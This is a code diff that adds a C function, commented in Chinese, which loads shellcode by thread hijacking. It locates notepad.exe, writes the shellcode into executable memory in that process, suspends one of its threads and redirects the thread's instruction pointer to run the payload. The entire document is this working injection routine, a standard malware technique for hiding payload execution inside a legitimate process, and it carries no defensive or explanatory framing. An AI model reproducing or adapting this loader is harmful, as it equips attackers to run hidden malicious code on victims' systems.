@@ -1,0 +1,70 @@
+// 线程劫持加载方式：修改现有线程上下文执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 线程劫持方式执行Shellcode\n");
+#endif
+    // 查找目标进程（notepad.exe）
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
+    if (!Process32First(snapshot, &processEntry)) return;
+    
+    DWORD targetPID = 0;
+    while (_stricmp(processEntry.szExeFile, "notepad.exe") != 0) {
+        if (!Process32Next(snapshot, &processEntry)) break;
+    }
+    targetPID = processEntry.th32ProcessID;
+    CloseHandle(snapshot);
+    if (targetPID == 0) return;
+
+    // 打开进程并分配内存
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        CloseHandle(hProcess);
+        return;
+    }
+    
+    // 写入Shellcode
+    WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);
+    
+    // 查找目标线程
+    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+    HANDLE hTargetThread = NULL;
+    
+    if (Thread32First(hThreadSnap, &threadEntry)) {
+        do {
+            if (threadEntry.th32OwnerProcessID == targetPID) {
+                hTargetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+                if (hTargetThread) break;
+            }
+        } while (Thread32Next(hThreadSnap, &threadEntry));
+    }
+    
+    if (hTargetThread) {
+        // 挂起线程
+        SuspendThread(hTargetThread);
+        
+        // 获取线程上下文
+        CONTEXT ctx = {0};
+        ctx.ContextFlags = CONTEXT_FULL;
+        GetThreadContext(hTargetThread, &ctx);
+        
+        // 修改指令指针
+#ifdef _WIN64
+        ctx.Rip = (DWORD_PTR)remoteMem;
+#else
+        ctx.Eip = (DWORD_PTR)remoteMem;
+#endif
+        
+        // 设置新上下文
+        SetThreadContext(hTargetThread, &ctx);
+        
+        // 恢复线程
+        ResumeThread(hTargetThread);
+        CloseHandle(hTargetThread);
+    }
+    
+    CloseHandle(hThreadSnap);
+    CloseHandle(hProcess);
+}
